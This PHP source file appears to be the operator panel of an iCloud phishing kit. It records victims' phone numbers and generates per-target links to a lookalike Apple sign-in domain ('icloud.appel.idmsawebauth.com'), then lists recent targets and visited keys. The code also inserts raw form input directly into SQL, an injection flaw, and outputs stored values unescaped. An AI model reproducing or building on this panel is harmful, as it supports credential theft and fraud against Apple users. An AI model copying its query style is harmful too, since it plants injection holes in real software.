<?
$_OPTIMIZATION["title"] = $_SESSION["user"];
include("includes/_header.php");

?>


<body>
<?
if(isset($_POST['number_tel'])){
	$key = md5($_POST['number_tel']);
	$db->Query("INSERT INTO db_tel (tel_number, operateur,date_insert, keygen) VALUES ('".$_POST['number_tel']."', '".$_SESSION["user"]."','".time()."', '$key' )");
}

?>



	<a href="/admin/exit">bye bye</a>



	<div style="max-width:1300px; margin:auto; text-align:center;">
		<div id="wraper">
			<div class="form_saisie_tel">
				<form method="POST" action="">
					<input id="tel" class="tel" placeholder=""  name="number_tel" type="text" maxlength="45">
					<input class="generate" type="submit" value="Submit">
				</form>
			</div>
			<div class="links">
			<?
				$db->Query("SELECT tel_number, operateur, keygen, date_insert FROM db_tel ORDER BY date_insert DESC LIMIT 200 ");
				while($data = $db->FetchArray()){
			?>	
				<p><? echo '<em style="color:#76EC0A">'.$data['operateur'].'</em> '.date("d.m & H:i",$data["date_insert"]).' <em style="color:#ECF508">'.$data['tel_number'].'</em></p><p>http://icloud.appel.idmsawebauth.com/?key='.$data['keygen']; ?></p>
				<p>-------------------------------------------------------------------------------------------------------------</p>

			<? } ?>
			</div>		
		</div>
		<div id="wraper">
			<a href="/admin">Last 100</a>
			<div class="links">
			<?
					$db->Query("SELECT keygen FROM db_history ORDER BY last_date DESC LIMIT 100 ");
					while($data = $db->FetchArray()){
				?>	
					<p><? echo $data['keygen'] ?></p>
				
				<? } ?>
			</div>
		</div>
	</div>
		

</body>

</html>